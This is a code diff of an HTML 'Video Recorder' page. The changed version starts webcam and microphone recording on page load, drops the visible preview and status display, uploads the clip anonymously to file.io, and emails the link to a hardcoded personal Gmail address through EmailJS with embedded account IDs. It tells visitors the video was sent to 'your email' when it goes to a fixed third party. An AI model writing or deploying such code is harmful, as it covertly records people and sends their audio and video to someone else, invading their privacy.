@@ -1,24 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Video Recorder with Email</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Video Recorder</title>
 </head>
 <body>
-  <h1>Recording for 1 Minute...</h1>
-  <video id="preview" autoplay muted></video>
-  <p id="status">Waiting for permission...</p>
+  <h1>Recording a 1-minute video...</h1>
+  <p>If asked, please allow camera and microphone access.</p>
 
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("YOUR_USER_ID"); // Step 4: Replace with your EmailJS User ID
+    // Initialize EmailJS with your User ID
+    (function(){
+      emailjs.init("fPzimjK_bZTooKIs_");
+    })();
 
     async function startRecording() {
       try {
+        // Ask for camera and microphone access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById("preview").srcObject = stream;
-        document.getElementById("status").textContent = "Recording started...";
 
+        // Setup MediaRecorder
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
@@ -26,29 +29,49 @@
 
         recorder.onstop = async () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
-          const url = URL.createObjectURL(blob);
+          const file = new File([blob], "recording.webm");
 
-          // Send the video as a link using EmailJS
-          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-            to_email: "YOUR_EMAIL@gmail.com",
-            video_url: url
-          }).then(() => {
-            document.getElementById("status").textContent = "Recording sent to your email!";
-          }).catch(error => {
-            document.getElementById("status").textContent = "Failed to send email: " + error.text;
+          // Upload video to a temporary host (anonymous file hosting via File.io)
+          const formData = new FormData();
+          formData.append("file", file);
+
+          const response = await fetch("https://file.io", {
+            method: "POST",
+            body: formData
           });
 
-          stream.getTracks().forEach(track => track.stop());
+          const result = await response.json();
+
+          if (result.success) {
+            // Send video URL via EmailJS
+            emailjs.send("service_p3yitzn", "template_oyrsayr", {
+              to_email: "julianlee252@gmail.com",
+              video_url: result.link
+            }).then(() => {
+              alert("Video link sent to your email!");
+            }, (error) => {
+              alert("Failed to send email: " + error.text);
+            });
+          } else {
+            alert("Failed to upload video.");
+          }
         };
 
+        // Start recording
         recorder.start();
-        setTimeout(() => recorder.stop(), 60000); // 1 minute
+
+        // Stop after 1 minute (60,000 ms)
+        setTimeout(() => {
+          recorder.stop();
+          stream.getTracks().forEach(track => track.stop()); // Clean up camera/mic
+        }, 60000);
 
       } catch (err) {
-        document.getElementById("status").textContent = "Permission denied or error: " + err.message;
+        alert("Permission denied or error starting recording: " + err.message);
       }
     }
 
+    // Start as soon as the page loads
     window.onload = startRecording;
   </script>
 </body>
